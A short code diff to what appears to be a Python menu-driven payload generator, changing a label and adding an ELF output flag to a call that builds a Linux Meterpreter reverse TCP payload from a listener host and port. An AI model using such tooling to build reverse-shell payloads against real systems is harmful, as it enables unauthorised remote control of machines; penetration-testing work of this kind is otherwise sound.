@@ -249,7 +249,7 @@ def linuxpayloadmenu():
     n = 1
     clearscreen()
     printbannred("Linux Payload Menu")
-    printopt("Create a simple Linux Meterpreter tcp payload")
+    printopt("Create a simple Meterpreter tcp  payload (bin)")
     inputy = inputc("Option: ").strip()
     lask()
     inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({linuxoutfile}){colorama.Fore.BLUE}: ")
@@ -259,7 +259,7 @@ def linuxpayloadmenu():
 
     if inputy == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
-        payloadgen2(f"linux/x86/meterpreter/reverse_{talkbackm1}", lhost, lport, linuxoutfile, '', '')
+        payloadgen2(f"linux/x86/meterpreter/reverse_{talkbackm1}", lhost, lport, linuxoutfile, '', '-f elf')
         menu()
     else:
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
